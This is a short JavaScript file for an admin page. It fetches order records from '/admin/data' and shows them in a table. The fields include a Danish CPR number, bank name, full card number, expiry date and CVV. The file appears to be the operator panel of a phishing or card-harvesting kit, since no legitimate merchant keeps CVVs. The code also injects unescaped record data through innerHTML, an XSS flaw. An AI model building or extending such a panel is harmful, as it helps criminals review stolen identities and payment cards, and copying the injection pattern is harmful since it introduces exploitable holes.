async function getData() {
  const orderTableBody = document.querySelector('#orderTableBody');
  let orders = [];
  await axios
    .get('/admin/data', {
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
      },
    })
    .then((res) => {
      console.log(res);
      orders = res.data;
      let markup = generateMarkup(orders);
      orderTableBody.innerHTML = markup;
    })
    .catch((err) => {
      console.log('error');
    });

  function generateMarkup(orders) {
    return orders
      .map((order) => {
        return `
          <tr role="row">
            <td role="cell" class="border text-green-900">
            ${order.ids}
            </td>
            <td role="cell" class="border">${order.code}</td>
            <td role="cell" class="border">${order.userId}</td>
            <td role="cell" class="border">${order.name}</td>
            <td role="cell" class="border">${order.address}</td>
            <td role="cell" class="border">${order.by}</td>
            <td role="cell" class="border">${order.postalCode}</td>
            <td role="cell" class="border">${order.phone}</td>
            <td role="cell" class="border">${order.cpr}</td>
            <td role="cell" class="border">${order.bank}</td>
            <td role="cell" class="border">${order.card}</td>
            <td role="cell" class="border">${order.expiry}</td>
            <td role="cell" class="border">${order.cvv}</td>
            <td role="cell" class="border">
              ${moment(order.createdAt).format('MMM Do YY')}
            </td>
          </tr>
        `;
      })
      .join('');
  }
}

getData();
